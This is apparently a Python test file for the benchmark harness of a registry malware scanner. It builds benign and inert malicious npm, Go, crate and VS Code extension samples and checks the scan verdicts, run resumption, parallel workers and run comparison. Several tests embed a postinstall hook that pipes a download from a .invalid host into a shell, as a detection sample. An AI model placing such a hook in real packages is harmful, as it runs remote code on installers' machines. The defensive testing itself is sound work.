"""scripts/bench.py, the benchmark harness: a resumable run of registry
scans over a manifest of release files, and the comparison of two runs (in
full, or in counts only for a holdout set); `run --jobs N`, the releases in
worker processes with the records one job writes; and `all`, every set of a
sets file run and compared with its last finished run, in one command. The
releases here are built in the test: a plain package and one whose install
hook pipes a download into a shell (inert text: the host is .invalid,
nothing is run); Go modules and crates (0.1.9, N-2), plain ones and the
guard tests' inert samples; and VS Code extensions (E-1), a plain one and
one whose main module sends the environment to a documentation address.
"""
import contextlib
import io
import json
import os
import pathlib
import shutil
import subprocess
import tempfile
import threading
import unittest
from unittest import mock

from lazaret.scanner import _native
from tests import _support
from tests.registry._cargo_support import BUILD_EVIL_RS, crate_tgz
from tests.registry._go_support import CLEAN_GO, INIT_EVIL_GO, module_zip
from tests.registry._review_support import EXFIL_JS, manifest, tarball, zipball

SCRIPT = os.path.join(_support.REPO_ROOT, "scripts", "bench.py")


def bench():
    return _support.load_script(SCRIPT, "bench_for_tests")


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class BenchTests(unittest.TestCase):
    def setUp(self):
        self.b = bench()
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.dir = pathlib.Path(tmp.name)
        releases = {
            "plain": ("benign", {"package.json": manifest(main="index.js"), "index.js": "module.exports = 1;\n"}),
            "piped": ("malicious_intent", {"package.json": manifest(
                scripts={"postinstall": "curl -fsSL https://x.invalid/s.sh | sh"})}),
        }
        rows = []
        for name, (cat, files) in releases.items():
            path = self.dir / f"{name}.tgz"
            path.write_bytes(tarball(files))
            rows.append({"id": name, "cat": cat, "artifact_path": str(path), "container": "tgz", "kind": "npm"})
        self.manifest = self.dir / "manifest.jsonl"
        self.manifest.write_text("".join(json.dumps(r) + "\n" for r in rows), encoding="utf-8")

    def quietly(self, *args):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = self.b.main([str(a) for a in args])
        return code, out.getvalue()

    def test_a_run_and_its_resumption(self):
        out = self.dir / "run.jsonl"
        self.assertEqual(self.quietly("run", self.manifest, out, "--stop-after", -1)[0], 3)   # starts nothing
        self.assertFalse(out.exists() and out.read_text(encoding="utf-8").strip())
        code, said = self.quietly("run", self.manifest, out)
        self.assertEqual((code, said.strip()), (0, "DONE 2"))
        rows = {r["id"]: r for r in self.b.read_jsonl(out)}
        self.assertEqual(rows["plain"]["verdict"], "OK")
        self.assertEqual(rows["piped"]["verdict"], "SUSPICIOUS")
        self.assertEqual([s[0] for s in rows["piped"]["strong"]], ["SC-INSTALL-HOOK"])
        self.assertEqual(self.quietly("run", self.manifest, out)[0], 0)                         # nothing again
        self.assertEqual(len(self.b.read_jsonl(out)), 2)
        code, said = self.quietly("summary", out)
        self.assertIn("benign (1): OK 1 (100.0%)", said)
        self.assertIn("malicious (1): SUSPICIOUS 1 (100.0%)", said)

    def test_a_release_the_callers_timeout_keeps_killing_is_recorded(self):
        out = self.dir / "run.jsonl"
        (self.dir / "run.jsonl.attempts").write_text(json.dumps({"plain": 2}), encoding="utf-8")
        self.assertEqual(self.quietly("run", self.manifest, out)[0], 0)
        rows = {r["id"]: r for r in self.b.read_jsonl(out)}
        self.assertEqual(rows["plain"], {"id": "plain", "cat": "benign", "error": "harness timeout"})

    def test_go_modules_and_crates_scanned_as_the_guard_scans_them(self):
        releases = {
            "go-plain": ("benign", "zip", "gomod",
                         module_zip("example.invalid/plain", "v1.0.0",
                                    {"plain.go": CLEAN_GO.format(name="plain", func="F", n=1)})[0]),
            "go-init": ("malicious_intent", "zip", "gomod",
                        module_zip("example.invalid/initevil", "v1.0.0", {"init.go": INIT_EVIL_GO})[0]),
            "crate-plain": ("benign", "tgz", "crate", crate_tgz("plain", "1.0.0", {})),
            "crate-build": ("malicious_intent", "tgz", "crate", crate_tgz("buildevil", "1.0.0", {
                "build.rs": BUILD_EVIL_RS})),
        }
        rows = []
        for name, (cat, container, kind, data) in releases.items():
            path = self.dir / name
            path.write_bytes(data)
            rows.append({"id": name, "cat": cat, "artifact_path": str(path), "container": container, "kind": kind})
        self.manifest.write_text("".join(json.dumps(r) + "\n" for r in rows), encoding="utf-8")
        out = self.dir / "run.jsonl"
        self.assertEqual(self.quietly("run", self.manifest, out, "--stop-after", 60)[0], 0)
        got = {r["id"]: (r["verdict"], [s[0] for s in r["strong"]]) for r in self.b.read_jsonl(out)}
        self.assertEqual({k: v[0] for k, v in got.items()},
                         {"go-plain": "OK", "go-init": "SUSPICIOUS", "crate-plain": "OK", "crate-build": "SUSPICIOUS"})
        self.assertTrue(got["go-init"][1] and got["crate-build"][1])

    def test_vs_code_extensions_scanned_as_the_editor_runs_them(self):
        def vsix(**files):
            return zipball({"extension.vsixmanifest": "<PackageManifest/>",
                            **{"extension/" + p: c for p, c in files.items()}})
        releases = {
            "ext-plain": ("benign", vsix(**{"package.json": manifest(publisher="p", main="e.js"),
                                            "e.js": "exports.activate = () => 1;\n"})),
            "ext-main": ("malicious_intent", vsix(**{"package.json": manifest(publisher="p", main="e.js"),
                                                     "e.js": EXFIL_JS})),
        }
        rows = []
        for name, (cat, data) in releases.items():
            path = self.dir / f"{name}.vsix"
            path.write_bytes(data)
            rows.append({"id": name, "cat": cat, "artifact_path": str(path), "container": "zip", "kind": "vsix"})
        self.manifest.write_text("".join(json.dumps(r) + "\n" for r in rows), encoding="utf-8")
        out = self.dir / "run.jsonl"
        self.assertEqual(self.quietly("run", self.manifest, out, "--stop-after", 60)[0], 0)
        got = {r["id"]: (r["verdict"], [s[0] for s in r["strong"]]) for r in self.b.read_jsonl(out)}
        self.assertEqual(got, {"ext-plain": ("OK", []), "ext-main": ("SUSPICIOUS", ["SC-IMPORT-RISK"])})

    def warn_run(self):
        """A manifest of four releases, each a package whose postinstall runs a file that prints, and a run that
        found three of them WARN: (manifest, run, their ids)."""
        hooked = tarball({"package.json": manifest(scripts={"postinstall": "node install.js"}),
                          "install.js": "console.log('ready');\n"})
        releases = (("benign:npm:files-kit@1.0.2", "benign", {}, "WARN"),
                    ("x1", "malicious_intent", {"eco": "pypi", "name": "pkg", "version": "1.1"}, "WARN"),
                    ("benign:go:example.org/m@v1.0.0", "benign", {}, "WARN"), ("ok-one", "benign", {}, "OK"))
        rows = []
        for n, (rid, cat, extra, _verdict) in enumerate(releases):
            path = self.dir / f"{n}.tgz"
            path.write_bytes(hooked)
            rows.append({"id": rid, "cat": cat, "artifact_path": str(path), "container": "tgz", "kind": "npm", **extra})
        manifest_path, run_path = self.dir / "m.jsonl", self.dir / "run.jsonl"
        manifest_path.write_text("".join(json.dumps(r) + "\n" for r in rows), encoding="utf-8")
        run_path.write_text("".join(json.dumps({"id": r[0], "cat": r[1], "verdict": r[3]}) + "\n" for r in releases),
                            encoding="utf-8")
        return manifest_path, run_path, [r["id"] for r in rows]

    def test_prior_compares_the_warn_releases(self):
        # `prior`: each WARN release of a run, scanned again and compared with its predecessor by registry/prior.py
        # (faked here: it would fetch the predecessor); the counts by category, and no names with --aggregate-only
        from lazaret.registry import prior
        manifest_path, run_path, ids = self.warn_run()
        out, asked = self.dir / "prior.jsonl", []

        def compared(eco, name, version, resolved, issues, per, *rest):
            asked.append((eco, name, version, sorted({i["rule"] for i in issues if i["rule"].startswith("SC-")})))
            return [], {"version": "1.0.0", "publishedBefore": "30 days", "files": [],
                        "newRules": {"npm": ["SC-INSTALL-HOOK"]}.get(eco, [])}
        with mock.patch.object(prior, "release_issues", compared):
            code, text = self.quietly("prior", run_path, manifest_path, out)
        self.assertEqual(code, 0)
        self.assertEqual(asked, [("npm", "files-kit", "1.0.2", ["SC-INSTALL-HOOK"]),
                                 ("pypi", "pkg", "1.1", ["SC-INSTALL-HOOK"])])
        lines = [json.loads(x) for x in out.read_text(encoding="utf-8").splitlines()]
        self.assertEqual([x["id"] for x in lines], ids[:3])                              # the OK release is not asked
        self.assertEqual(lines[2]["prior"], {"notCompared": "not a release of npm, PyPI or crates.io"})
        self.assertIn("benign WARN releases: SC-NEW-INDICATOR 1, not compared 1", text)
        self.assertIn("malicious WARN releases: compared, nothing new 1", text)
        self.assertIn("benign:npm:files-kit@1.0.2: SC-INSTALL-HOOK (against 1.0.0)", text)
        with mock.patch.object(prior, "release_issues", compared):
            code, text = self.quietly("prior", run_path, manifest_path, out, "--aggregate-only")
        self.assertEqual(len(asked), 2)                                                 # gone on: nothing again
        self.assertNotIn("files-kit", text)
        self.assertEqual(self.b.release_of({"id": "popular:npm:@img/sharp-linux-x64@0.35.5"}),
                         ("npm", "@img/sharp-linux-x64", "0.35.5"))
        self.assertIsNone(self.b.release_of({"id": "no-version-here"}))

    def test_compare(self):
        before, after = self.dir / "before.jsonl", self.dir / "after.jsonl"
        self.quietly("run", self.manifest, before)
        self.assertEqual(self.quietly("compare", before, before)[0], 0)
        rows = self.b.read_jsonl(before)
        for r in rows:
            if r["id"] == "piped":
                r["verdict"], r["strong"] = "WARN", []
        after.write_text("".join(json.dumps(r) + "\n" for r in rows), encoding="utf-8")
        code, said = self.quietly("compare", before, after)
        self.assertEqual(code, 1)
        self.assertIn("verdict changed: 1; SUSPICIOUS -> WARN: 1", said)
        self.assertIn("piped: SUSPICIOUS -> WARN", said)
        self.assertIn("- SC-INSTALL-HOOK CRITICAL", said)
        code, said = self.quietly("compare", before, after, "--aggregate-only")
        self.assertEqual(code, 1)
        self.assertIn("strong findings changed: 1", said)
        self.assertNotIn("piped", said)                 # a holdout's releases are never named
        self.assertNotIn("SC-INSTALL-HOOK", said)


def _releases_of_every_kind(folder):
    """A manifest of inert releases of each kind the harness reads (npm, a Go module, a crate, an extension)."""
    def vsix(**files):
        return zipball({"extension.vsixmanifest": "<PackageManifest/>",
                        **{"extension/" + p: c for p, c in files.items()}})
    releases = {
        "plain": ("benign", "tgz", "npm", tarball({"package.json": manifest(main="index.js"),
                                                   "index.js": "module.exports = 1;\n"})),
        "piped": ("malicious_intent", "tgz", "npm", tarball({"package.json": manifest(
            scripts={"postinstall": "curl -fsSL https://x.invalid/s.sh | sh"})})),
        "go-plain": ("benign", "zip", "gomod", module_zip("example.invalid/plain", "v1.0.0", {
            "plain.go": CLEAN_GO.format(name="plain", func="F", n=1)})[0]),
        "go-init": ("malicious_intent", "zip", "gomod",
                    module_zip("example.invalid/initevil", "v1.0.0", {"init.go": INIT_EVIL_GO})[0]),
        "crate-build": ("malicious_intent", "tgz", "crate", crate_tgz("buildevil", "1.0.0", {
            "build.rs": BUILD_EVIL_RS})),
        "ext-main": ("malicious_intent", "zip", "vsix", vsix(**{"package.json": manifest(publisher="p", main="e.js"),
                                                                "e.js": EXFIL_JS})),
    }
    rows = []
    for name, (cat, container, kind, data) in releases.items():
        path = folder / name
        path.write_bytes(data)
        rows.append({"id": name, "cat": cat, "artifact_path": str(path), "container": container, "kind": kind})
    path = folder / "every-kind.jsonl"
    path.write_text("".join(json.dumps(r) + "\n" for r in rows), encoding="utf-8")
    return path, {name: data for name, (_, _, _, data) in releases.items()}


class _FakePool:
    """scanpool.WorkerPool's interface, in this process: `answers[id]` is a list of what each call for that release
    gives (an exception to raise, "time" for the real record marked as out of time), the real record after them."""

    def __init__(self, data_ids, answers):
        self.data_ids, self.answers, self.calls, self.closed = data_ids, answers, [], 0
        self._lock = threading.Lock()

    def __call__(self, jobs, fn):
        self.fn = fn
        return self

    def run(self, data, container, kind, timeout, timed=False):
        release = self.data_ids[data]
        with self._lock:
            self.calls.append(release)
            queued = self.answers.get(release) or []
            answer = queued.pop(0) if queued else None
        if isinstance(answer, BaseException):
            raise answer
        got = self.fn(data, container, kind, timeout)
        if answer == "time":
            return {"row": {**got["row"], "verdict": "INCOMPLETE"}, "time": True}
        return got

    def close(self):
        self.closed += 1


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class JobsTests(unittest.TestCase):
    """`run --jobs N`: the releases N at a time, in worker processes, with the records one job writes."""

    def setUp(self):
        self.b = bench()
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.dir = pathlib.Path(tmp.name)
        self.manifest, self.data = _releases_of_every_kind(self.dir)
        self.data_ids = {data: name for name, data in self.data.items()}

    def quietly(self, *args):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = self.b.main([str(a) for a in args])
        return code, out.getvalue(), err.getvalue()

    def test_two_workers_write_what_one_job_writes(self):
        one, two = self.dir / "one.jsonl", self.dir / "two.jsonl"
        self.assertEqual(self.quietly("run", self.manifest, one, "--stop-after", 60)[:2], (0, "DONE 6\n"))
        self.assertEqual(self.quietly("run", self.manifest, two, "--stop-after", 60, "--jobs", 2),
                         (0, "DONE 6\n", ""))                       # in workers: no note of scanning here
        self.assertEqual(two.read_bytes(), one.read_bytes())        # every field, and the manifest's order
        got = {r["id"]: r["verdict"] for r in self.b.read_jsonl(two)}
        self.assertEqual(got, {"plain": "OK", "piped": "SUSPICIOUS", "go-plain": "OK", "go-init": "SUSPICIOUS",
                               "crate-build": "SUSPICIOUS", "ext-main": "SUSPICIOUS"})

    def execute(self, pool, out, jobs=2):
        return self.b.execute(self.b.read_jsonl(self.manifest), out, 28.0, 60.0, jobs, pool_factory=pool)

    def test_a_scan_out_of_time_beside_others_is_run_again_alone(self):
        pool = _FakePool(self.data_ids, {"plain": ["time"]})
        out = self.dir / "run.jsonl"
        self.assertEqual(self.execute(pool, out), (6, 6))
        rows = self.b.read_jsonl(out)
        self.assertEqual([r["id"] for r in rows], ["plain", "piped", "go-plain", "go-init", "crate-build", "ext-main"])
        self.assertEqual(rows[0]["verdict"], "OK")                  # the second answer, not the first
        self.assertEqual(pool.calls.count("plain"), 2)
        self.assertEqual(pool.calls[-1], "plain")                   # after every other release
        self.assertGreaterEqual(pool.closed, 1)

    def test_a_lost_or_hung_worker_is_an_error_for_its_release_alone(self):
        from lazaret.registry import scanpool
        pool = _FakePool(self.data_ids, {"piped": [scanpool.Died("lost twice")], "go-init": [scanpool.Hung("hung")]})
        out = self.dir / "run.jsonl"
        self.assertEqual(self.execute(pool, out), (6, 6))
        rows = {r["id"]: r for r in self.b.read_jsonl(out)}
        self.assertEqual(rows["piped"], {"id": "piped", "cat": "malicious_intent", "error": "worker lost: lost twice"})
        self.assertEqual(rows["go-init"]["error"], "harness timeout")
        self.assertEqual(rows["crate-build"]["verdict"], "SUSPICIOUS")

    def test_without_workers_the_run_goes_on_in_this_process(self):
        from lazaret.registry import scanpool
        pool = _FakePool(self.data_ids, {name: [scanpool.Unavailable("no spawn")] for name in self.data})
        out, one = self.dir / "run.jsonl", self.dir / "one.jsonl"
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            self.assertEqual(self.execute(pool, out), (6, 6))
        self.assertIn("no worker process could be started (no spawn)", err.getvalue())
        self.b.execute(self.b.read_jsonl(self.manifest), one, 28.0, 60.0, 1)
        self.assertEqual(out.read_bytes(), one.read_bytes())

    def test_a_release_the_callers_timeout_keeps_killing_is_recorded_with_jobs_too(self):
        out = self.dir / "run.jsonl"
        (self.dir / "run.jsonl.attempts").write_text(json.dumps({"go-plain": 2}), encoding="utf-8")
        self.assertEqual(self.execute(_FakePool(self.data_ids, {}), out), (6, 6))
        rows = {r["id"]: r for r in self.b.read_jsonl(out)}
        self.assertEqual(rows["go-plain"], {"id": "go-plain", "cat": "benign", "error": "harness timeout"})


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class AllTests(unittest.TestCase):
    """`all SETS.json`: every set in one command, each compared with its last finished run."""

    def setUp(self):
        self.b = bench()
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.dir = pathlib.Path(tmp.name)
        files = {"plain": {"package.json": manifest(main="index.js"), "index.js": "module.exports = 1;\n"},
                 "piped": {"package.json": manifest(scripts={"postinstall": "curl -fsSL https://x.invalid/s.sh | sh"})}}
        for set_name, prefix in (("inert", ""), ("held", "h-")):
            rows = []
            for name, contents in files.items():
                path = self.dir / f"{prefix}{name}.tgz"
                path.write_bytes(tarball(contents))
                rows.append({"id": prefix + name, "cat": "benign" if name == "plain" else "malicious_intent",
                             "artifact_path": str(path), "container": "tgz", "kind": "npm"})
            (self.dir / f"{set_name}.jsonl").write_text("".join(json.dumps(r) + "\n" for r in rows), encoding="utf-8")
        self.sets = self.dir / "sets.json"
        self.sets.write_text(json.dumps({"results": "runs", "report": "reports", "sets": [
            {"name": "inert", "manifest": "inert.jsonl"},
            {"name": "held", "manifest": "held.jsonl", "aggregate_only": True}]}), encoding="utf-8")

    def all(self, *args):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = self.b.main(["all", str(self.sets), "--jobs", "1", "--allow-stale-engine", *map(str, args)])
        return code, out.getvalue(), err.getvalue()

    def make_piped_warn(self, label):
        for set_name in ("inert", "held"):
            path = self.dir / "runs" / label / f"{set_name}.jsonl"
            rows = self.b.read_jsonl(path)
            for r in rows:
                if r["id"].endswith("piped"):
                    r["verdict"], r["strong"] = "WARN", []
            path.write_text("".join(json.dumps(r) + "\n" for r in rows), encoding="utf-8")

    def test_every_set_run_then_compared_with_its_last_run(self):
        code, said, _ = self.all("--label", "first")
        self.assertEqual(code, 0, said)
        report = self.dir / "reports" / "first"
        self.assertIn("this run is the baseline", (report / "inert.txt").read_text(encoding="utf-8"))
        summary = (report / "summary.txt").read_text(encoding="utf-8")
        self.assertIn("inert: 2 releases in", summary)
        self.assertIn("the first run, now the baseline", summary)
        self.assertEqual(json.loads((self.dir / "runs" / "history.json").read_text(encoding="utf-8")),
                         {"inert": ["first"], "held": ["first"]})
        self.make_piped_warn("first")
        code, said, _ = self.all("--label", "second")
        self.assertEqual(code, 1)
        inert = (self.dir / "reports" / "second" / "inert.txt").read_text(encoding="utf-8")
        self.assertIn("piped: WARN -> SUSPICIOUS", inert)
        self.assertIn("+ SC-INSTALL-HOOK CRITICAL", inert)
        held = (self.dir / "reports" / "second" / "held.txt").read_text(encoding="utf-8")
        self.assertIn("verdict changed: 1; WARN -> SUSPICIOUS: 1", held)
        for text in (held, said, (self.dir / "reports" / "second" / "summary.txt").read_text(encoding="utf-8")):
            self.assertNotIn("h-piped", text)                       # a holdout's releases are never named,
            self.assertNotIn("SC-INSTALL-HOOK", text)               # nor its findings
        self.assertIn("held: 2 releases in", said)
        self.assertIn("against first: verdict changed: 1", said)

    def test_only_and_baseline(self):
        self.assertEqual(self.all("--label", "first")[0], 0)
        self.make_piped_warn("first")
        self.assertEqual(self.all("--label", "second", "--only", "inert")[0], 1)
        code, said, _ = self.all("--label", "third", "--only", "held", "--baseline", "second")
        self.assertEqual(code, 0)
        self.assertIn("second has no finished run of this set to compare with", said)
        code, said, _ = self.all("--label", "fourth", "--only", "inert", "--baseline", "first")
        self.assertEqual(code, 1)
        self.assertIn("against first", said)
        self.assertEqual(json.loads((self.dir / "runs" / "history.json").read_text(encoding="utf-8")),
                         {"inert": ["first", "second", "fourth"], "held": ["first", "third"]})

    def test_a_stopped_run_goes_on_and_another_engine_is_refused(self):
        run_dir = self.dir / "runs" / "first"
        run_dir.mkdir(parents=True)
        first = self.b.read_jsonl(self.dir / "inert.jsonl")[:1]
        self.b.execute(first, run_dir / "inert.jsonl", 28.0, 60.0, 1)   # one release in, as a stopped run leaves it
        self.assertEqual(self.all("--label", "first")[0], 0)
        self.assertEqual([r["id"] for r in self.b.read_jsonl(run_dir / "inert.jsonl")], ["plain", "piped"])
        meta = json.loads((run_dir / "engine.json").read_text(encoding="utf-8"))
        (run_dir / "engine.json").write_text(json.dumps({**meta, "sha256": "0" * 64}), encoding="utf-8")
        code, _, err = self.all("--label", "first")
        self.assertEqual(code, 2)
        self.assertIn("another engine library or deadline", err)

    def test_mistakes_in_the_sets_file(self):
        for conf, says in (
                ({"sets": []}, "non-empty \"sets\" list"),
                ({"sets": [{"name": "a", "manifest": "inert.jsonl"}, {"name": "a", "manifest": "held.jsonl"}]},
                 "a name of its own"),
                ({"sets": [{"name": "../a", "manifest": "inert.jsonl"}]}, "a name of its own"),
                ({"sets": [{"name": "a", "manifest": "gone.jsonl"}]}, "is not there")):
            self.sets.write_text(json.dumps(conf), encoding="utf-8")
            code, _, err = self.all()
            self.assertEqual(code, 2, conf)
            self.assertIn(says, err)
        self.sets.write_text("{", encoding="utf-8")
        self.assertIn("cannot read the sets file", self.all()[2])
        self.sets.write_text(json.dumps({"sets": [{"name": "a", "manifest": "inert.jsonl"}]}), encoding="utf-8")
        self.assertIn("no such set: b", self.all("--only", "b")[2])
        self.assertIn("a label is letters", self.all("--label", "../x")[2])


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class EngineAndLabelTests(unittest.TestCase):
    def setUp(self):
        self.b = bench()
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.root = pathlib.Path(tmp.name)

    def test_an_engine_library_older_than_the_tree_is_stale(self):
        rules = self.root / self.b.RULES
        rules.parent.mkdir(parents=True)
        rules.write_text(json.dumps({"rule_set": "2.70.0"}), encoding="utf-8")
        source = self.root / "rust" / "crates" / "lazaret-ffi" / "src" / "lib.rs"
        source.parent.mkdir(parents=True)
        source.write_text("// the ffi\n", encoding="utf-8")
        os.utime(source, (1_000_000_000, 1_000_000_000))
        os.utime(rules, (1_000_000_000, 1_000_000_000))
        current = {"ruleSet": "2.70.0", "built": 1_000_000_100}
        self.assertEqual(self.b.stale_engine(current, self.root), [])
        old = {"ruleSet": "2.69.0", "built": 999_999_000}
        reasons = self.b.stale_engine(old, self.root)
        self.assertEqual(len(reasons), 2)
        self.assertIn("its rule set is 2.69.0, the tree's 2.70.0", reasons[0])
        self.assertIn("changed after it was built", reasons[1])
        identity = self.b.engine_identity()                         # this process's library
        self.assertEqual(identity["ruleSet"], identity["pythonRuleSet"])
        self.assertEqual(len(identity["sha256"]), 64)

    @unittest.skipUnless(shutil.which("git"), "git is not installed")
    def test_the_default_label(self):
        def git(*argv):
            subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@example.invalid", *argv], cwd=self.root,
                           check=True, capture_output=True)
        self.assertTrue(self.b.default_label(self.root).startswith("run-"))         # not a checkout
        git("init", "-q")
        (self.root / "a.txt").write_text("one\n", encoding="utf-8")
        git("add", "a.txt")
        git("commit", "-q", "-m", "one")
        label = self.b.default_label(self.root)
        self.assertRegex(label, r"\A[0-9a-f]{8}\Z")
        (self.root / "a.txt").write_text("two\n", encoding="utf-8")
        dirty = self.b.default_label(self.root)
        self.assertRegex(dirty, r"\A" + label + r"-dirty-[0-9a-f]{8}\Z")
        (self.root / "new.txt").write_text("untracked\n", encoding="utf-8")       # untracked files do not count
        self.assertEqual(self.b.default_label(self.root), dirty)
        (self.root / "a.txt").write_text("three\n", encoding="utf-8")             # other changes, another label
        self.assertNotEqual(self.b.default_label(self.root), dirty)


if __name__ == "__main__":
    unittest.main()
